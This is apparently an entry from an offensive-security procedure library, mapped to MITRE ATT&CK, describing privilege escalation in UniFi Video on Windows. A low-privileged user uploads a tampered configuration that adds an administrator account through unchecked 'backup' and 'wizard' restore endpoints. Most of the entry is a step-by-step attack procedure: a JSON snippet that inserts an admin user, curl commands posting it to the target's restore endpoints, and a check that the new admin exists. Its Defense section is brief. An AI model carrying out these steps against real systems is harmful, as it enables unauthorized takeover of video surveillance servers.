---
id: proc-upload-config-priv-esc-329659
tags:
  - privilege-escalation
  - config-manipulation
  - unifi-video
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:29:09.718Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Upload-Malicious-Configuration-for-Privilege-Escalation

## Summary

This procedure exploits the vulnerable 'backup' and 'wizard' endpoints in UniFi Video to upload a modified configuration file, overwriting settings to create new administrative users and achieve full privilege escalation from a low-privileged session.

## Description

With access to the UniFi Video web interface on Windows, low-privileged users can POST modified configuration files (e.g., backup archives or JSON) to the restore functions at 'backup' and 'wizard' endpoints due to missing privilege checks. This procedure involves crafting a payload that alters user permissions or adds admin accounts, then submitting it via HTTP. The attack targets the configuration layer, leading to persistent privilege escalation. Prerequisites include endpoint access and knowledge of config file structure.

## Requirements

1. Active low-privileged session with endpoint access
2. Modified configuration file (e.g., backup with added admin user)
3. HTTP client supporting file uploads

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all configuration uploads with integrity checks
- Restrict restore functions to admin-only via proper RBAC
- Monitor for unexpected config changes and user additions post-upload

## Objectives

1. Overwrite application configurations to modify user privileges
2. Create or elevate a user to admin level
3. Gain full control over the UniFi Video instance

## Instructions

### Step 1: Craft Malicious Configuration

**Context**: Modify a legitimate backup file to include privilege-escalating changes, such as adding a new admin user.

Use a text editor or JSON tool to edit the config file, e.g., add {"users": [{"name": "newadmin", "group": "ADMIN_GROUP", "privileges": "full"}] }.

### Step 2: Upload to 'backup' Endpoint

**Context**: Submit the file to the backup restore function.

Execute a POST with file upload using curl:

```bash
curl -X POST -b cookies.txt -F "file=@malicious_config.backup" https://target-unifi-video/backup/restore
```

> Expected output: Success message or 200 response indicating config applied.

### Step 3: Upload to 'wizard' Endpoint and Verify

**Context**: Use the wizard endpoint for additional config application and check for escalation.

Execute a POST and then verify new user:

```bash
curl -X POST -b cookies.txt -F "config=@malicious_config.json" https://target-unifi-video/wizard/restore
curl -X GET -b cookies.txt https://target-unifi-video/users
```

> Expected output: Config restored, and users list shows new admin.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[privilege-escalation]]
- [[config-manipulation]]
- [[unifi-video]]
